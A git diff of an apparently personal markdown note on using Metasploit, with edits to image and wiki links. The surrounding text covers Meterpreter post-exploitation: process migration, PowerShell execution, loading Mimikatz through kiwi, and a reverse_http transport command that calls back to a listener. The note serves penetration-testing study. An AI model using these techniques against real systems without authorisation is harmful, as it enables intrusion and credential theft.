@@ -1,6 +1,9 @@
 # Metasploit 
 This as simple document condensing the usage of the `msfconsole`. For specific [[Meterpreter-Commands]] related follow the link for [[Pivoting-and-Proxying-with-Metasploit]] follow this one. For a brief `msvenom` usage see [[Shells]] or for building a Metasploit module see [[Build-MSF-Modules]] 
 
+![meterpeter](Images/msf-popped-shell.gif)
+
+
 ## Introduction
 
 [Metasploit](https://www.metasploit.com/) despite its nae sayers is an incredible tool making the figgly manual process more stream-line and less error prown. It's curation of exploit code helps address the issues with dangers of using public exploit code as well providing the utility of post exploit and enumeration tools in one console framework. Although for those post beginner phase I would recommend as was to me, learn the wonders of metasploit then do it manually, Exploit Frameworks like Metasploit are used because the reduce issues and complexity. It also Open-Source, although similar to Burpsuite in the respect that its core functionality is so very powerful that the commercial version is not really relevent to those that aren't professionals. Metasploit is even more overwhelming in features than Burpsuite Community the Pro version provides alot of features to the Open source version, as awesome as they are the path to learn to use something that makes it easy to not make mistakes is the reason that Metasploit is still awesome and you can learn, apply skill manually and use other tools for much of the [Pro version](https://www.rapid7.com/products/metasploit/download/editions/) offers. 
@@ -147,7 +150,7 @@ transport add -t reverse_http -l 10.10.10.10 -p 5105 -T 50000 -W 2500 -C 100000 
 
 ## Metasploit Post Exploitation
 
-Metasploit has post-exploitation features and MSF modules that take an active sessions as an argument. These features are best examplified with the various [[Meterpreter-Commands]], although a important feature is `migrate $PSID`-ing to different more stable and more privileged processes in memory. With the `load` command in a Meterpreter one load various modules such as `powershell` and then `powershell_execute`, see [[Useful_Powershell]] for help with basic powershell. Similar `load kiwi` will load [[Mimikatz]]. For [[Pivoting-and-Proxying-with-Metasploit]], it different for different version of Metasploit.
+Metasploit has post-exploitation features and MSF modules that take an active sessions as an argument. These features are best examplified with the various [[Meterpreter-Commands]], although a important feature is `migrate $PSID`-ing to different more stable and more privileged processes in memory. With the `load` command in a Meterpreter one load various modules such as `powershell` and then `powershell_execute`, see [[Useful_Powershell]] for help with basic powershell. Similar `load kiwi` will load [[Mimikatz-Cheatsheet]]. For [[Pivoting-and-Proxying-with-Metasploit]], it different for different version of Metasploit.
 
 ## Further Automation
 We can pass a .rc file that automates the entire process in similar way as recent versions of [[Recon-ng]].
@@ -163,3 +166,4 @@ sudo msfconsole -r setup.rc
 [Rapid7 Workspaces](https://docs.rapid7.com/metasploit/managing-workspaces/)
 [darkreading on client side attacks](https://www.darkreading.com/risk/anatomy-of-a-client-side-attack-using-metasploit)
 [OS Client Side attacks with Metasploit](https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/)
+[Gif source](https://www.offensive-security.com/offsec/what-to-expect-new-oscp-exam/)
